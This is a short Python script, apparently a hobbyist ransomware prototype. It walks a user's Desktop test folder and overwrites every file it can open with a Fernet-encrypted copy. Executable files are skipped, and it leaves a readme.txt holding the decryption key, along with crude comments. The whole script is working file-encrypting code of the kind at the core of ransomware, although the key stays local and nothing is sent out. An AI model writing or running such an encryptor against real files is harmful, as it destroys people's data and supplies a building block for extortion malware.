import os
from cryptography.fernet import Fernet

# generate a random symmetric key
key = Fernet.generate_key()

# create a Fernet object with the key
fernet = Fernet(key)

# specify the directory to encrypt
directory = "C:/Users/%userprofile%/Desktop/Test" # I don't actually know if %userprofile% works because i didn't test it 

# encrypt all the files in the directory and its subdirectories
for root, dirs, files in os.walk(directory):
    for filename in files:
        # skip over exe files
        if filename.endswith(".exe"): # os.walk likes to error on exe files, gives a "permission error" lol
            continue
        try:
            # open the file, read the contents and encrypt them
            with open(os.path.join(root, filename), "rb") as file:
                encrypted = fernet.encrypt(file.read())
            # write the encrypted data back to the file
            with open(os.path.join(root, filename), "wb") as file:
                file.write(encrypted)
            print(f"Encrypted {os.path.join(root, filename)}")
        except PermissionError:
            print(f"Skipped {os.path.join(root, filename)}")

# create a note with the key
try:
    with open(os.path.join(directory, "readme.txt"), "w") as file:
        file.write(f"Use this key to decrypt: {key.decode()}")
    print("Encryption complete.")
except PermissionError:
    print(f"Encryption complete, but could not create the key file.\nYour key is right here, don't fucking lose it dumbass.{key.decode()}")
